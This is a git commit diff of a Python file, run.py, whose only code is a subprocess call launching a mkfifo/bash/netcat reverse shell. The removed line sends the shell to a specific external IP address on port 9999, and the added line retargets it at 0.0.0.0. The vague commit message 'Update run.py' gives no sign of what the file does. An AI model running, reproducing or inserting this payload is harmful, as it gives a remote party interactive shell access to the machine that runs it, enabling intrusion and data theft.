2db4bd426737091cb362c146ab5e3b9c19012fbe
Hirukshacoder <97717488+Hirukshacoder@users.noreply.github.com>
2022-07-03 19:54:23 +0530

    Update run.py

--- run.py
+++ run.py
@@ -1,4 +1,4 @@
 import subprocess
 
 
-subprocess.run("mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 172.104.191.185 9999 >/tmp/f")
+subprocess.run("mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f")
